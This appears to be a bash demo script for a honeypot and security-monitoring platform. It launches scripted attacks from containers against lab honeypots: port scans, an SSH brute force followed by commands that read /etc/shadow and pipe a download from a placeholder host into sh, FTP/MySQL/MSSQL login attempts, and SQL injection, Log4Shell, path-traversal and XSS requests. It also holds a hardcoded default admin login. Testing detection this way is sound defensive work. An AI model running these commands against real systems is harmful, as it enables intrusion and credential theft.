#!/usr/bin/env bash
#
# demo.sh — the guided ShadowTrust walkthrough for a live demo / viva.
#
# Not "trigger four honeypots and stop". Five attackers, each with different
# behaviour, each in its own throwaway container. After every stage the script tells you
# which page to open and what the PLATFORM did with the attack; at the end it
# reads the real result back out of the database so nothing on screen is a
# canned claim. The honeypots are the front door; the SOC pipeline is the
# product:
#
#   sensor capture -> normalise -> detection rules -> correlation into a case
#   -> graded severity (LOW / MEDIUM / HIGH / CRITICAL) -> MITRE ATT&CK mapping
#
#   ./scripts/demo.sh             # one screen per stage, Enter to move on
#   ./scripts/demo.sh --fast      # no waiting for Enter (smoke test)
#   DEMO_PAUSE=25 ./scripts/demo.sh   # advance by itself every 25s
#   DEMO_WAIT=45  ./scripts/demo.sh   # how long to wait for a rule (default 30s)
#
# Attacks run in a throwaway container on the lab network: no tools needed on
# your Mac, no password prompts, nothing to mistype.

set -uo pipefail
cd "$(dirname "$0")/.."

FAST=0; [ "${1:-}" = "--fast" ] && FAST=1
WAIT="${DEMO_WAIT:-30}"; TAB=$'\t'
FRONT="http://localhost:${FRONTEND_PORT:-5500}"
IMG="st-attacker:latest"; EDGE="honeynet_edge"
COWRIE="honeynet_cowrie"; DIONAEA="honeynet_dionaea"; HONEYTRAP="honeynet_honeytrap"

if [ -t 1 ]; then
  TTY=1; B=$'\e[1m'; R=$'\e[0m'; D=$'\e[38;5;245m'; P=$'\e[38;5;99m'; BL=$'\e[38;5;39m'
  GR=$'\e[38;5;42m'; YE=$'\e[38;5;214m'; RD=$'\e[38;5;197m'; CY=$P
  trap 'printf "\e[?25h"' EXIT; trap 'exit 130' INT
else TTY=0; B=; D=; R=; CY=; GR=; YE=; RD=; P=; BL=; fi
FR=(⠋ ⠙ ⠹ ⠸ ⠼ ⠴ ⠦ ⠧ ⠇ ⠏)
NAMES=(Recon Breach "Service creds" "Web attack" Malware)
W=80; CUR=
RULE="────────────────────────────────────────────────────────────────────────────────"

# Every stage is one screen, and the panels follow the pipeline in order:
# ATTACK -> CAPTURED -> DETECTED -> CASE -> EXPLAIN -> OPEN IN THE BROWSER.
say()  { printf '%s\n' "$*"; }
wipe() { [ "$TTY" = 1 ] && printf '\r\e[K\e[?25h'; }
tick() { [ "$TTY" = 1 ] && printf '\r\e[?25l  %s▍%s %s%s%s %s' "$CUR" "$R" "$P" "${FR[$1 % 10]}" "$R" "${D}$2${R}"; }

# pill <SEVERITY>: a filled badge, always 10 columns wide
pill() {
  local c
  [ "$TTY" = 1 ] || { printf '%-10s' "$1"; return; }
  case "$1" in
    CRITICAL) c=$'\e[48;5;197m\e[1;97m';; HIGH) c=$'\e[48;5;208m\e[1;30m';;
    MEDIUM)   c=$'\e[48;5;220m\e[30m';;   *)    c=$'\e[48;5;42m\e[30m';;
  esac
  printf '%s %-8s %s' "$c" "$1" "$R"
}

# sec <LABEL> [hint]: a panel heading with a rule; ln <text>: one line inside it
sec() {
  local c h="${2:-}"
  case "$1" in
    ATTACK) c=$RD;; CAPTURED|EVENTS) c=$BL;; DETECTED|RULES) c=$GR;; CASE|CASES) c=$YE;; *) c=$P;;
  esac
  CUR=$c; echo
  printf '  %s%s%s %s%s%s%s\n' "$B$c" "$1" "$R" "$D" "${RULE:0:$((W - ${#1} - ${#h} - 1 - (${#h} > 0)))}" "${h:+ $h}" "$R"
}
ln()      { printf '  %s▍%s %s\n' "$CUR" "$R" "$1"; [ "$TTY$FAST" = 10 ] && sleep 0.03; return 0; }
row()     { [ -n "$1" ] && sec "$1"; ln "$2"; }                      # row <LABEL|""> <text>
cmd()     { row ATTACK "$1"; }
explain() { row EXPLAIN "$1"; }
page()    { [ -n "$1" ] && sec "OPEN IN THE BROWSER"; ln "$(printf '%s%-20s%s %s' "$B" "$2" "$R" "${D}$3${R}")"; }

# banner <n> <right-hand text>: brand line plus the five-step progress track
banner() {
  local i t=""
  [ "$TTY" = 1 ] && clear
  echo; printf '  %s◆ ShadowTrust%s  %slive attack walkthrough%*s%s%s\n' "$B$P" "$R" "$D" $((W - 38 - ${#2})) "" "$2" "$R"
  for i in 1 2 3 4 5; do
    if   [ "$i" -lt "$1" ]; then t="$t${GR}✓ ${NAMES[i-1]}${R}"
    elif [ "$i" -eq "$1" ]; then t="$t${B}${P}● ${NAMES[i-1]}${R}"
    else t="$t${D}○ ${NAMES[i-1]}${R}"; fi
    [ "$i" -lt 5 ] && t="$t ${D}──${R} "
  done
  echo; say "  $t"
}
# stage <n> <title> <one-line subtitle>
stage() { banner "$1" "stage $1 of 5"; echo; say "  ${B}$2${R}"; say "  ${D}$3${R}"; }

# hit <tag> <script>: run one attacker with a spinner, and remember when it started
hit() {
  local i=0 t=$SECONDS rc
  T0=$(Q "SELECT UTC_TIMESTAMP() - INTERVAL 2 SECOND")
  attack "$@" &
  while kill -0 $! 2>/dev/null; do tick $((i++)) "attacker container running"; sleep 0.1; done
  wait $!; rc=$?; wipe
  # 125-127 = docker could not start the container; anything else is the attack's own exit code
  if [ "$rc" -ge 125 ]; then ln "${RD}x attacker container failed to start (docker exit $rc)${R}"
  else ln "${GR}✓${R} ${D}sent in $((SECONDS - t))s from a throwaway attacker container${R}"; fi
}

# verify <rule-id>...: wait for the rules to fire, then print what the DATABASE
# holds: events ingested since the attack, each rule, and the case they landed
# in. Nothing here is typed in; a rule that did not fire is shown as not fired.
verify() {
  local in="" r rows line id name sv tech fresh ip title risk n i=0 stale=0 src=""
  for r in "$@"; do in="$in,'$r'"; done; in="${in#,}"
  local sql="SELECT d.rule_id, d.rule_name, d.severity, IFNULL(d.attack_technique,'-'), d.created_at >= '$T0', IFNULL(d.source_ip,'')
    FROM detections d WHERE d.rule_id IN ($in)
    AND d.created_at = (SELECT MAX(created_at) FROM detections WHERE rule_id = d.rule_id) GROUP BY d.rule_id"
  CUR=$GR
  while :; do
    rows=$(Q "$sql")
    n=$(printf '%s\n' "$rows" | awk -F'\t' '$5==1{c++} END{print c+0}')
    [ "$n" -ge $# ] || [ "$i" -ge "$WAIT" ] && break
    tick $((i++)) "waiting for the detection engine  $n/$# rules"; sleep 1
  done
  wipe

  sec CAPTURED "ingested since the attack began"
  line=$(Q "SELECT GROUP_CONCAT(CONCAT(sensor, ' ', n, ' events') ORDER BY n DESC SEPARATOR '   ') FROM
    (SELECT sensor, COUNT(*) n FROM normalized_events WHERE ingested_at >= '$T0' GROUP BY sensor) x")
  src=$(printf '%s\n' "$rows" | awk -F'\t' '$5==1 && $6!=""{print $6; exit}')
  if [ -n "$line" ] && [ "$line" != NULL ]; then ln "$line${src:+   ${D}attacker $src${R}}"
  else ln "${YE}· no new events ingested yet${R}"; fi

  sec DETECTED "read live from the database"
  for r in "$@"; do
    line=$(printf '%s\n' "$rows" | awk -F'\t' -v r="$r" '$1==r')
    if [ -z "$line" ]; then
      ln "${YE}· $r   has not fired yet${R}"
    else
      IFS=$TAB read -r id name sv tech fresh ip <<<"$line"
      if [ "$fresh" = 1 ]; then line="${GR}✓${R}"; else line="${D}●${R}"; stale=1; fi
      ln "$(printf '%s %s%-13s%s %-38s %s  %s' "$line" "$B" "$id" "$R" "$name" "$(pill "$sv")" "${D}$tech${R}")"
    fi
  done
  [ "$stale" = 1 ] && ln "${D}● already on record: the engine does not re-alert inside its window${R}"

  rows=$(Q "SELECT i.severity, i.title, ROUND(i.risk_score), COUNT(d.id) FROM incidents i
    JOIN detections d ON d.incident_id = i.id WHERE d.rule_id IN ($in) AND d.created_at >= '$T0' GROUP BY i.id")
  [ -n "$rows" ] || return 0
  sec CASE "correlated by the engine"
  while IFS=$TAB read -r sv title risk n; do
    ln "$(printf '%s  %s%s%s  %s' "$(pill "$sv")" "$B" "$title" "$R" "${D}risk $risk · $n of these detections${R}")"
  done <<<"$rows"
}

pause() {
  echo
  [ "$FAST" = 1 ] && return
  [ -n "${DEMO_PAUSE:-}" ] && { sleep "$DEMO_PAUSE"; return; }
  [ -t 0 ] || return
  printf '  %s⏎ Enter%s %s%s%s' "$B$P" "$R" "$D" "${1:-next stage}" "$R"; read -r -s _; echo
}

# attack <tag> <script> — one throwaway attacker container on the lab network
attack() {
  docker run --rm --network "$EDGE" --name "st-demo-$1-$RANDOM" \
    -e C="$COWRIE" -e D="$DIONAEA" -e H="$HONEYTRAP" "$IMG" "$2" >/dev/null 2>&1
}

Q() { docker exec honeynet_db sh -c 'mariadb -u"$MARIADB_USER" -p"$MARIADB_PASSWORD" "$MARIADB_DATABASE" -N -B -e "$1"' _ "$1" 2>/dev/null; }

# ── preflight ────────────────────────────────────────────────────────────────
command -v docker >/dev/null || { say "${RD}docker not found.${R}"; exit 1; }
for c in "$COWRIE" "$DIONAEA" "$HONEYTRAP" honeynet_backend honeynet_db; do
  docker ps --format '{{.Names}}' | grep -qx "$c" || {
    say "${RD}$c is not running.${R}  Start the stack:  docker compose up -d"; exit 1; }
done
docker network inspect "$EDGE" >/dev/null 2>&1 || { say "${RD}network $EDGE missing.${R}"; exit 1; }
docker image inspect "$IMG" >/dev/null 2>&1 || {
  say "${YE}building the attacker image (first run)...${R}"; docker build -q -t "$IMG" scripts/attacker/ >/dev/null; }

banner 0 "5 stages"
echo; say "  ${B}Five attacks, one platform${R}"
say "  ${D}Each is captured by a sensor, detected by a rule, graded, mapped to MITRE.${R}"
row STAGES "1  Reconnaissance"
row "" "2  Brute force, then a breach"
row "" "3  Service credential theft"
row "" "4  Web application attack"
row "" "5  Malware analysis"
row "BEFORE YOU START" "Open ${B}${FRONT}${R} and sign in."
row "" "Keep the browser next to this window: each attack shows up there live."
pause "start"

# ── STAGE 1 · Reconnaissance ─────────────────────────────────────────────────
stage 1 "Reconnaissance" "The attacker maps which services are exposed."
cmd "Port sweep across 18 service ports on Dionaea, then an nmap pass"
hit recon 'for p in 21 22 23 25 80 110 135 139 143 443 445 1433 3306 3389 5060 8080 27017 11211; do nc -z -w1 "$D" $p; done
nmap -sT -Pn -T4 -p 21,80,135,443,445,1433,3306,5060 "$D" "$H" 2>/dev/null | tail -2'
verify st-recon-006
explain "The rule counts DISTINCT ports from one IP, not packets,"
row "" "so a noisy single connection does not look like a scan."
page OPEN "Event Log" "burst of Dionaea connections from one new IP"
page "" "MITRE ATT&CK" "Discovery column lights up"
pause

# ── STAGE 2 · Brute force -> breach (one actor, one CRITICAL case) ────────────
stage 2 "Brute force, then a breach" "One attacker, the whole kill chain, ending in a single case."
cmd "7 wrong SSH passwords for root, then the one Cowrie accepts,"
row "" "then commands typed by hand and two payload downloads"
hit breach 'for pw in 123456 password root toor admin 1234 letmein; do sshpass -p "$pw" ssh -p 2222 root@"$C" true 2>/dev/null; done
sshpass -p hunter2 ssh -p 2222 root@"$C" "whoami; id; uname -a; cat /etc/passwd; cat /etc/shadow; crontab -l; wget http://198.51.100.9/bot.sh; curl http://198.51.100.9/x.sh | sh; exit" 2>/dev/null'
verify st-auth-001 st-cred-002 st-exec-003 st-exec-004
explain "Four rules, one attacker: the engine correlates them into ONE case"
row "" "with a risk breakdown, the full timeline and the captured credential."
page OPEN "Investigations" "the new case: timeline and why this severity"
page "" "Credential Vault" "root / hunter2 captured, plus the 7 rejected attempts"
page "" "Behaviour Profiling" "actor classed hands-on-keyboard, kill chain advanced"
pause

# ── STAGE 3 · Service credential theft (Dionaea FTP / MySQL / MSSQL) ──────────
stage 3 "Service credential theft" "Not only SSH: the other sensor captures logins too."
cmd "FTP, MySQL and MSSQL logins against Dionaea"
# Every client is wrapped in `timeout`: Dionaea captures the login during the
# handshake but never completes it, so an unguarded tsql/mariadb would hang. The
# credential is already captured by the time the client is killed.
hit svccreds 'timeout 8 curl -s --user oracle:oracle123 ftp://"$D":21/ >/dev/null 2>&1
{ printf "USER admin\r\n"; sleep 1; printf "PASS Password1\r\n"; sleep 1; printf "RETR /etc/passwd\r\n"; sleep 1; printf "QUIT\r\n"; } | timeout 10 nc -w6 "$D" 21 >/dev/null 2>&1
timeout 10 mariadb -h "$D" -P 3306 -u root -ptoor123 --ssl=0 --connect-timeout=6 -e "show databases" >/dev/null 2>&1
printf "quit\n" | timeout 8 tsql -H "$D" -p 1433 -U sa -P "Passw0rd!" >/dev/null 2>&1
true'
verify st-cred-003
explain "The login is captured during the handshake, so the attacker never"
row "" "gets in, but the platform keeps the username and password they tried."
page OPEN "Credential Vault" "FTP, MYSQL and MSSQL rows next to the SSH ones"
pause

# ── STAGE 4 · Web application attack (Honeytrap) ─────────────────────────────
stage 4 "Web application attack" "Injection, Log4Shell and path traversal requests."
cmd "Four malicious HTTP requests against Honeytrap"
hit web 'curl -s -m5 "http://$H:8022/?id=1%27%20OR%20%271%27=%271" -A "sqlmap/1.7" >/dev/null 2>&1
curl -s -m5 "http://$H:8022/" -A "\${jndi:ldap://198.51.100.9/a}" >/dev/null 2>&1
curl -s -m5 "http://$H:8022/index.php?page=../../../../etc/passwd" >/dev/null 2>&1
curl -s -m5 "http://$H:8022/?q=<script>alert(1)</script>" >/dev/null 2>&1'
verify st-web-002
explain "Honeytrap logs every URL and user agent; the rule matches the"
row "" "attack patterns inside them and maps to Initial Access."
page OPEN "Event Log" "Honeytrap HTTP requests with the injection strings"
page "" "MITRE ATT&CK" "Initial Access is now populated"
pause

# ── STAGE 5 · Malware analysis (the platform's own pipeline) ──────────────────
stage 5 "Malware analysis" "The platform analyses a sample itself, it does not only capture."
cmd "Upload the industry-standard antivirus test file to the malware pipeline"
EICAR='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
TOK=$(Q "SELECT 1" >/dev/null 2>&1 && curl -s -m10 -X POST "http://localhost:8000/api/v1/auth/login" -d "username=admin@gmail.com&password=admin" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
if [ -n "${TOK:-}" ]; then
  printf '%s' "$EICAR" > /tmp/st-eicar.com
  RES=$(curl -s -m30 -X POST "http://localhost:8000/api/v1/malware/upload" -H "Authorization: Bearer $TOK" -F "file=@/tmp/st-eicar.com" 2>/dev/null)
  rm -f /tmp/st-eicar.com
  HASH=$(printf '%s' "$RES" | sed -n 's/.*"hash": *"\([^"]*\)".*/\1/p')
  if [ -n "$HASH" ]; then row DETECTED "${GR}✓${R} analysed and stored  ${D}sha256 ${HASH:0:16}...${R}"
  else row DETECTED "${YE}· uploaded, no report yet (ClamAV may still be loading signatures)${R}"; fi
else
  row DETECTED "${YE}· skipped: default admin sign-in failed. Upload it from the Malware page.${R}"
fi
explain "The platform analyses as well as captures: hashing, ClamAV, YARA rules"
row "" "and a secrets scan, with the report stored against the file hash."
page OPEN "Malware Laboratory" "the sample flagged, with its signatures and score"
pause

# ── Read the result back out of the platform ─────────────────────────────────
# All-time rule coverage: the engine de-dupes a repeated attack from the same IP
# inside its window (correct: it will not re-alert), so count every rule that
# has ever fired. Proves all detections work regardless of how often you re-run.
banner 6 "result"
echo; say "  ${B}What the platform did${R}"; say "  ${D}Every number below is read from its database right now.${R}"
label=RULES
while IFS=$TAB read -r id name sv n; do
  [ -n "$id" ] || continue
  row "$label" "$(printf '%s%-13s%s %-38s %s  %s' "$B" "$id" "$R" "$name" "$(pill "$sv")" "${D}x$n${R}")"; label=""
done <<<"$(Q "SELECT rule_id, rule_name, severity, COUNT(*) FROM detections GROUP BY rule_id, rule_name, severity ORDER BY FIELD(severity,'CRITICAL','HIGH','MEDIUM','LOW'), COUNT(*) DESC")"
label=CASES
while IFS=$TAB read -r sv n; do
  [ -n "$sv" ] || continue
  row "$label" "$(printf '%s  %s' "$(pill "$sv")" "$n")"; label=""
done <<<"$(Q "SELECT severity, COUNT(*) FROM incidents GROUP BY severity ORDER BY FIELD(severity,'CRITICAL','HIGH','MEDIUM','LOW')")"
label=EVENTS
while IFS=$TAB read -r sensor n; do
  [ -n "$sensor" ] || continue
  row "$label" "$(printf '%-10s %s events' "$sensor" "$n")"; label=""
done <<<"$(Q "SELECT sensor, FORMAT(COUNT(*),0) FROM normalized_events GROUP BY sensor ORDER BY COUNT(*) DESC")"
explain "Recon, brute force, breach, post-exploitation, service and web attack,"
row "" "malware triage. The honeypots are only where it starts: the product is"
row "" "the pipeline that turns each one into a graded, MITRE-mapped case."
row "WALK THE PAGES" "Overview > Event Log > Investigations > Credential Vault"
row "" "> MITRE ATT&CK > Behaviour Profiling > Reports"
echo
